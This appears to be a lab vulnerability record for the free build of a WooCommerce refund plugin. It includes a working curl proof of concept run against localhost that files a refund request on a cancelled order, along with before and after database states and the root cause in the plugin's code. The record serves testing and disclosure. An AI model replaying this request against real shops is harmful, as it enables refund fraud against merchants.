@@ -1,0 +1,25 @@
+# FR-03 — Missing order-status check (free build): refund request accepted on a CANCELLED order
+# Lab: WordPress 7.1.2 + WooCommerce 11.1.2 + Flexible Refund 2.0.3 (free).
+# Actor = customer 'attacker' (uid 2) acting on OWN order 13, status wc-cancelled.
+
+## DB BEFORE
+  order 13 status: wc-cancelled
+  wp_fr_requests rows for 13: 0
+
+## ATTACK — submit a refund request on the cancelled order
+$ curl -b attacker.cookies 'http://localhost:8088/my-account/fr-refund/13/?form_id=1' \
+   --data 'fr_refund_form[items][3][qty]=1' --data 'fr_refund_form[form_id]=1' \
+   --data 'fr_refund_form[fr_refund_request]=4d56e5f988'
+
+## RESPONSE (headers)
+  HTTP/1.1 302 Found
+  Location: /my-account/fr-refund/13/?form_id=1&request=send
+
+## DB AFTER
+    id	order_id	status
+    13	13	requested
+    
+  order 13 status: wc-refund-request   <-- cancelled order pulled into wc-refund-request
+
+## The plugin ships EXCLUDED_CONDITIONS=['wc-cancelled','wc-refunded','wc-failed'] in RefundCondition,
+## but FormAvailability::can_start() only evaluates it under if($this->is_pro) -> free build never checks status.
